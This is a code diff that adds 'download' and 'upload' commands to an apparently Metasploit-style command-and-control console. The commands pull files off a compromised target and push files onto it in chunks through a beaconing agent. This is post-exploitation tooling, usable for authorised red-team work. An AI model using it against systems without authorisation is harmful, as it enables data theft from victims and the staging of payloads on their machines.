@@ -3,6 +3,9 @@
 Provides MSF-style session interaction:
 - sessions list — List all active sessions
 - sessions interact <id> — Interactive session shell
+- sessions results <id> — Output of commands the agent already answered
+- sessions download <id> <remote> [local] — Pull a file off the target
+- sessions upload <id> <local> <remote> — Push a file to the target
 - sessions kill <id> — Kill session
 - sessions info <id> — Session details
 - sessions rename <id> <name> — Relabel a session for operators
@@ -118,6 +121,139 @@ async def sessions_interact(tui: Any, args: List[str]) -> Dict[str, Any]:
 
     print("  Interaction ended.")
     return {"status": "ok", "session_id": session_id}
+
+
+async def sessions_download(tui: Any, args: List[str]) -> Dict[str, Any]:
+    """Pull a file off the target, in chunks, and save it locally.
+
+    Usage: sessions download <id> <remote-path> [local-path]
+
+    fs_get on its own prints base64 into the terminal, which is useless for
+    anything but a small text file; this reassembles the pieces to disk.
+    """
+    import base64
+    import json
+    import os
+
+    if len(args) < 2:
+        tui.render_error("Usage: sessions download <id> <remote> [local]")
+        return {"status": "error", "error": "Usage: sessions download <id> <remote> [local]"}
+
+    session_id, remote = args[0], args[1]
+    local = args[2] if len(args) > 2 else os.path.join(
+        ".", "downloads", os.path.basename(remote.replace("\\", "/").rstrip("/")) or "downloaded_file"
+    )
+
+    engine = tui._engine
+    if await engine.sessions.get(session_id) is None:
+        tui.render_error(f"Session not found: {session_id}")
+        return {"status": "error", "error": f"Session not found: {session_id}"}
+
+    timeout = interaction_timeout(tui)
+    chunk_size = 512 * 1024
+    offset = 0
+    total = -1
+    parent = os.path.dirname(os.path.abspath(local))
+    os.makedirs(parent, exist_ok=True)
+
+    # Written incrementally: a target-side file can be larger than the
+    # operator's memory, and each chunk is already on the wire.
+    with open(local, "wb") as sink:
+        while True:
+            line = json.dumps({"action": "fs_get", "path": remote,
+                               "offset": offset, "length": chunk_size})
+            raw = await _run_agent_command(engine, session_id, line, timeout)
+            if raw is None:
+                tui.render_error("Agent did not answer the download request (still beacons?).")
+                return {"status": "error", "error": "download timed out"}
+            try:
+                payload = json.loads(raw)
+            except json.JSONDecodeError:
+                tui.render_error(f"Agent returned an unreadable chunk: {raw[:200]}")
+                return {"status": "error", "error": "unreadable chunk"}
+            if "error" in payload:
+                tui.render_error(f"Download failed: {payload['error']}")
+                return {"status": "error", "error": payload["error"]}
+
+            data = base64.b64decode(payload.get("data", ""))
+            if not data:
+                break
+            sink.write(data)
+            total = payload.get("size", -1)
+            offset += len(data)
+            if payload.get("eof") or (total >= 0 and offset >= total):
+                break
+            tui.render_success(f"  {offset}/{total} bytes")
+
+    tui.render_success(f"Saved {offset} bytes to {local}")
+    return {"status": "ok", "session_id": session_id, "local": local, "bytes": offset}
+
+
+async def sessions_upload(tui: Any, args: List[str]) -> Dict[str, Any]:
+    """Push a local file to the target in offset chunks.
+
+    Usage: sessions upload <id> <local-path> <remote-path>
+    """
+    import base64
+    import json
+    import os
+
+    if len(args) < 3:
+        tui.render_error("Usage: sessions upload <id> <local> <remote>")
+        return {"status": "error", "error": "Usage: sessions upload <id> <local> <remote>"}
+
+    session_id, local, remote = args[0], args[1], args[2]
+    engine = tui._engine
+    if await engine.sessions.get(session_id) is None:
+        tui.render_error(f"Session not found: {session_id}")
+        return {"status": "error", "error": f"Session not found: {session_id}"}
+    if not os.path.isfile(local):
+        tui.render_error(f"Local file not found: {local}")
+        return {"status": "error", "error": f"Local file not found: {local}"}
+
+    timeout = interaction_timeout(tui)
+    chunk_size = 512 * 1024
+    size = os.path.getsize(local)
+    offset = 0
+
+    with open(local, "rb") as fh:
+        while True:
+            data = fh.read(chunk_size)
+            if not data:
+                break
+            task = {
+                "action": "fs_put",
+                "path": remote,
+                "offset": offset,
+                "data": base64.b64encode(data).decode(),
+            }
+            raw = await _run_agent_command(
+                engine, session_id, json.dumps(task), timeout
+            )
+            if raw is None:
+                tui.render_error("Agent did not answer the upload request.")
+                return {"status": "error", "error": "upload timed out"}
+            try:
+                reply = json.loads(raw)
+            except json.JSONDecodeError:
+                tui.render_error(f"Agent returned an unreadable reply: {raw[:200]}")
+                return {"status": "error", "error": "unreadable reply"}
+            if not reply.get("ok"):
+                tui.render_error(f"Upload failed: {reply.get('error', 'unknown')}")
+                return {"status": "error", "error": reply.get("error", "upload refused")}
+            offset += len(data)
+            tui.render_success(f"  {offset}/{size} bytes")
+
+    tui.render_success(f"Uploaded {offset} bytes to {remote}")
+    return {"status": "ok", "session_id": session_id, "remote": remote, "bytes": offset}
+
+
+async def _run_agent_command(engine: Any, session_id: str, command: str, timeout: float) -> Optional[str]:
+    """Queue one command and wait for the agent's answer."""
+    command_id = await engine.sessions.interact(session_id, command)
+    if not command_id:
+        return None
+    return await _await_command_result(engine, session_id, command_id, timeout)
 
 
 def interaction_timeout(tui: Any) -> float:
